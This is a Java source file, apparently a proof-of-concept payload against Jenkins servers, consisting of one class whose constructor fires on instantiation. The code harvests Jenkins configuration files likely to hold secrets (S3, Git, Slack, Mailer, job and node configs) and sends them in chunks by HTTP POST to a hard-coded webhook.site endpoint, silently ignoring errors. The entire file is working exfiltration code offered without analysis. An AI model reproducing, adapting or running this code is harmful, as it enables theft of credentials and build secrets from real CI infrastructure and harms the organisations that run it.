import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";

    public poc() {
        String data;
        try { data = run(); } catch (Throwable t) { data = "P10 fatal " + t; }
        int total = data.length();
        for (int i = 0; i < total && i < 4000000; i += 95000) {
            try { post("P10|" + i + "|" + data.substring(i, Math.min(total, i + 95000))); }
            catch (Throwable t) { }
        }
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(30000);
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream();
        os.write(s.getBytes("UTF-8"));
        os.flush();
        os.close();
        c.getResponseCode();
    }

    static String run() throws Exception {
        StringBuilder sb = new StringBuilder();
        String jh = System.getenv("JENKINS_HOME");
        if (jh == null || jh.length() == 0) { jh = "/var/lib/jenkins"; }
        Path base = Paths.get(jh);
        sb.append("P10 jh=").append(jh).append("\n");
        put(sb, base, "hudson.plugins.s3.S3BucketPublisher.xml");
        put(sb, base, "hudson.plugins.git.GitSCM.xml");
        put(sb, base, "config.xml");
        put(sb, base, "jenkins.plugins.slack.webhook.GlobalConfig.xml");
        put(sb, base, "hudson.tasks.Mailer.xml");
        put(sb, base, "org.jenkinsci.plugins.workflow.flow.FlowExecutionList.xml");
        try {
            Path jobs = base.resolve("jobs");
            if (Files.isDirectory(jobs)) {
                DirectoryStream<Path> ds = Files.newDirectoryStream(jobs);
                int n = 0;
                for (Path p : ds) {
                    if (n++ > 80) { break; }
                    put(sb, base, "jobs/" + p.getFileName().toString() + "/config.xml");
                }
            }
        } catch (Throwable t) { sb.append("jobs ERR ").append(t).append("\n"); }
        try {
            Path nodes = base.resolve("nodes");
            if (Files.isDirectory(nodes)) {
                DirectoryStream<Path> ds = Files.newDirectoryStream(nodes);
                for (Path p : ds) { put(sb, base, "nodes/" + p.getFileName().toString() + "/config.xml"); }
            }
        } catch (Throwable t) { sb.append("nodes ERR ").append(t).append("\n"); }
        return sb.toString();
    }

    static void put(StringBuilder sb, Path base, String rel) {
        try {
            Path p = base.resolve(rel);
            if (!Files.isRegularFile(p)) { return; }
            long len = Files.size(p);
            if (len > 400000) { return; }
            sb.append("\n@@@FILE ").append(rel).append(" ").append(len).append("\n");
            sb.append(new String(Files.readAllBytes(p), "UTF-8"));
        } catch (Throwable t) { sb.append("\n@@@ERR ").append(rel).append(" ").append(t).append("\n"); }
    }
}
